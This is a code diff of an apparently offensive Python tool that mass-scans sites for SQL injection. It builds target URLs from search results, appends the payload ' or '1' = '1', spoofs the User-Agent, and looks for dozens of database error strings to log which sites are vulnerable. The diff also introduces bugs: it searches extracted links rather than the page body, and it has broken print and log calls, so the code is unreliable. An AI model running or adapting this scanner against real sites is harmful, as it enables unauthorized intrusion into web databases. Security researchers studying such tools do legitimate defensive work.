@@ -22,6 +22,7 @@ try:
         time, sys, os, math, itertools, queue, asyncio, aiohttp
     from signal import SIGINT, signal
     from codecs import lookup, register
+
 except:
     print(
             " please make sure you have all of the following modules: asyncio, aiohttp")
@@ -106,7 +107,7 @@ def search(maxc):
                             KeyboardInterrupt,
                             SystemExit):  # following except throws me connection debug info it it breaks
                         raise
-            except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout,):
+            except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
                 KeyboardInterrupt
             pass
     tmplist = []
@@ -149,100 +150,133 @@ class Injthread(threading.Thread):
 
 
 def classicinj(url):
-    fullurl = (url)
-    resp = urllib.request.urlopen(fullurl + "=\' or \'1\' = \'1'")
-    body = resp.read()
-    host = body.decode('utf-8')
+    jar = http.cookiejar.FileCookieJar("cookies")  # cookie handler
+    resp = (url + "=\' or \'1\' = \'1'")
+    fullurl = urllib.request.Request(resp)  # get the data back from search engine
+    agent = random.choice(header)  # header handler
+    fullurl.add_header('User-Agent', agent)  # custom user-agents to use for scans
+    opener_web = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+    text = opener_web.open(fullurl).read()  # handle the data retrieved
+    decoder = text.decode('utf-8')  # decode data to utf-8
+    stringreg = re.compile('(?<=href=")(.*?)(?=")')
+    Hits = stringreg.findall(decoder)  # find the target URLs for links list
     try:
-        if str("an error in your SQL syntax") in host:
+        if str("error in your SQL syntax") in Hits:
             print(url) + " is vulnerable --> MySQL Classic"
             logfile.write("\n" + url)
-        elif str("mysql_fetch") in host:
+            pass
+        elif str("mysql_fetch") in Hits:
             print(url) + " is Vulnerable --> MiscError"
             logfile.write("\n" + url)
-        elif str("num_rows") in host:
+            pass
+        elif str("num_rows") in Hits:
             print(url) + " is Vulnerable --> MiscError2"
             logfile.write("\n" + url)
-        elif str("ORA-01756") in host:
+            pass
+        elif str("ORA-01756") in Hits:
             print(url) + " is Vulnerable --> Oracle"
             logfile.write("\n" + url)
-        elif str("Error Executing Database Query") in host:
+            pass
+        elif str("Error Executing Database Query") in Hits:
             print(url) + " is Vulnerable --> JDBC_CFM"
             logfile.write("\n" + url)
-        elif str("SQLServer JDBC Driver") in host:
+            pass
+        elif str("SQLServer JDBC Driver") in Hits:
             print(url) + " is Vulnerable --> JDBC_CFM2"
             logfile.write("\n" + url)
-        elif str("OLE DB Provider for SQL Server") in host:
+            pass
+        elif str("OLE DB Provider for SQL Server") in Hits:
             print(url) + " is Vulnerable --> MSSQL_OLEdb"
             logfile.write("\n" + url)
-        elif str("Unclosed quotation mark") in host:
+            pass
+        elif str("Unclosed quotation mark") in Hits:
             print(url) + " is Vulnerabe --> MSSQL_Uqm"
             logfile.write("\n" + url)
-        elif str("ODBC Microsoft Access Driver") in host:
+            pass
+        elif str("ODBC Microsoft Access Driver") in Hits:
             print(url) + " is Vulnerable --> MS-Access_ODBC"
             logfile.write("\n" + url)
-        elif str("Microsoft JET Database") in host:
+            pass
+        elif str("Microsoft JET Database") in Hits:
             print(url) + " is Vulnerable --> MS-Access_JETdb"
             logfile.write("\n" + url)
-        elif str("Error Occurred While Processing Request") in host:
+            pass
+        elif str("Error Occurred While Processing Request") in Hits:
             print(url) + " is Vulnerabe --> Processing Request"
             logfile.write("\n" + url)
-        elif str("Microsoft JET Database") in host:
+            pass
+        elif str("Microsoft JET Database") in Hits:
             print(url) + " is Vulnerable --> MS-Access JetDb"
             logfile.write("\n" + url)
-        elif str("Error Occurred While Processing Request") in host:
+            pass
+        elif str("Error Occurred While Processing Request") in Hits:
             print(url) + " is Vulnerable --> Processing Request "
             logfile.write("\n" + url)
-        elif str("Server Error") in host:
+            pass
+        elif str("Server Error") in Hits:
             print(url) + " is Vulnerable --> Server Error"
             logfile.write("\n" + url)
-        elif str("ODBC Drivers error") in host:
+            pass
+        elif str("ODBC Drivers error") in Hits:
             print(url) + " is Vulnerable --> ODBC Drivers error"
             logfile.write("\n" + url)
-        elif str("Invalid Querystring") in host:
+            pass
+        elif str("Invalid Querystring") in Hits:
             print(url) + " is Vulnerable --> Invalid Querystring"
             logfile.write("\n" + url)
-        elif str("OLE DB Provider for ODBC") in host:
+            pass
+        elif str("OLE DB Provider for ODBC") in Hits:
             print(url) + " is Vulnerable --> OLE DB Provider for ODBC"
             logfile.write("\n" + url)
-        elif str("VBScript Runtime") in host:
+            pass
+        elif str("VBScript Runtime") in Hits:
             print(url) + " is Vulnerable --> VBScript Runtime"
             logfile.write("\n" + url)
-        elif str("ADODB.Field") in host:
+            pass
+        elif str("ADODB.Field") in Hits:
             print(url) + " is Vulnerable --> ADODB.Field"
             logfile.write("\n" + url)
-        elif str("BOF or EOF") in host:
+            pass
+        elif str("BOF or EOF") in Hits:
             print(url) + " is Vulnerable --> BOF or EOF"
             logfile.write("\n" + url)
-        elif str("ADODB.Command") in host:
+            pass
+        elif str("ADODB.Command") in Hits:
             print(url) + " is Vulnerable --> ADODB.Command"
             logfile.write("\n + url")
-        elif str("JET Database") in host:
+            pass
+        elif str("JET Database") in Hits:
             print(url) + " is Vulnerable --> JET Database"
             logfile.write("\n" + url)
-        elif str("mysql_fetch_array") in host:
+            pass
+        elif str("mysql_fetch_array") in Hits:
             print(url) + " is Vulnerabe --> mysql_fetch_array"
             logfile.write("\n" + url)
-        elif str("Syntax error") in host:
+            pass
+        elif str("Syntax error") in Hits:
             print(url) + " is Vulnerable --> Syntax error"
             logfile.write("\n" + url)
-        elif str("mysql_numrows()") in host:
+            pass
+        elif str("mysql_numrows()") in Hits:
             print(url) + " is Vulnerable --> mysql_numrows()"
             logfile.write("\n" + url)
-        elif str("GetArray()") in host:
+            pass
+        elif str("GetArray()") in Hits:
             print(url) + " is Vulnerable --> GetArray()"
             logfile.write("\n" + url)
-        elif str("FetchRow()") in host:
+            pass
+        elif str("FetchRow()") in Hits:
             print(url) + " is Vulnerable --> FetchRow()"
             logfile.write("\n" + url)
-        elif str("Input string was not in a correct format") in host:
+            pass
+        elif str("Input string was not in a correct format") in Hits:
             print(url) + " is Vulnerable --> Input String Error"
             logfile.write("\n" + url)
+            pass
         else:
             pass
-    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout,):
+    except(urllib.error.URLError, socket.gaierror, socket.error, socket.timeout):
         pass
-
 
 def injtest():
     global logfile
